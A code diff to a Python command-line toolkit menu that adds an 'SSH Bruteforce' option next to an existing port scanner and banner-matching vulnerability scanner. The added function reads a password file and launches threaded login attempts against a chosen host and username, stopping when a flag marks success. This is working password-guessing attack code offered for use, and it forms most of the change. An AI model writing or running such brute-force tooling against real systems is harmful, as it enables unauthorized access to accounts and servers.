@@ -1,5 +1,9 @@
+import threading
+import time
 import portScanner
-import portScanner_vulscan
+import portScanner_vulscan as vul
+import sshbrutethreaded as ssh
+
 
 def Portscanner_options():
     targets = input('[+] Enter Target/s To Scan(split multiple targets with ,): ')
@@ -58,41 +62,70 @@ def Vulscan():
     if ',' in targets:
         for ip_add in targets.split(','):
             if value != 1:
-                portScanner_vulscan.scan(ip_add, portsArray[0], portsArray[1], time)
+                vul.scan(ip_add, portsArray[0], portsArray[1], time)
             else:
-                portScanner_vulscan.scan1(ip_add, portsArray, time)
+                vul.scan1(ip_add, portsArray, time)
     else:
         # if its not a specific target or targets i.e a range
         if value != 1:
-            portScanner_vulscan.scan(targets.strip(' '), portsArray[0], portsArray[1], time)
+            vul.scan(targets.strip(' '), portsArray[0], portsArray[1], time)
         else:
-            portScanner_vulscan.scan1(targets.strip(' '), portsArray, time)
+            vul.scan1(targets.strip(' '), portsArray, time)
     try:
         with open(vul_file, 'r') as file:
             count = 0
-            for banner in portScanner_vulscan.banners:
+            for banner in vul.banners:
                 file.seek(0)
                 for line in file.readlines():
                     if line.strip() in banner:
-                        print('[!!] VULNERABLE BANNER: "' + banner + '" ON PORT: ' + str(portScanner_vulscan.open_ports[count]))
+                        print('[!!] VULNERABLE BANNER: "' + banner + '" ON PORT: ' + str(
+                            vul.open_ports[count]))
                 count += 1
     except FileNotFoundError:
         print("File not accessible")
     finally:
         file.close()
 
+def SSH():
+    host = input('[+] Target Address: ')
+    username = input('[+] SSH Username: ')
+    input_file = input('[+] Passwords File: ')
+    print('\n')
+
+    # check if the file exist
+    def file(passwordfile):
+        global f
+        try:
+            f = open(passwordfile, 'r')
+        except IOError:
+            print("File not accessible")
+        else:
+            print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')
+            with f as passwords:
+                for line in passwords.readlines():
+                    if ssh.stop_flag == 1:
+                        t.join()
+                        exit()
+                    password = line.strip()
+                    t = threading.Thread(target=ssh.ssh_connect, args=(host, username, password,))
+                    t.start()
+                    time.sleep(0.5)
+        finally:
+            f.close()
+    file(input_file)
+
 
 if __name__ == '__main__':
 
-    print("[1] PortScanner")
+    print("[1] PortScanner      [2] Vulnerability Scanner     [3] SSH Bruteforce")
     option = str(input("Pick a program: "))
     if option == "1":
         Portscanner_options()
     elif option == "2":
         Vulscan()
+    elif option == "3":
+        SSH()
     else:
         print("Not an option")
-
-
 
 # See PyCharm help at https://www.jetbrains.com/help/pycharm/
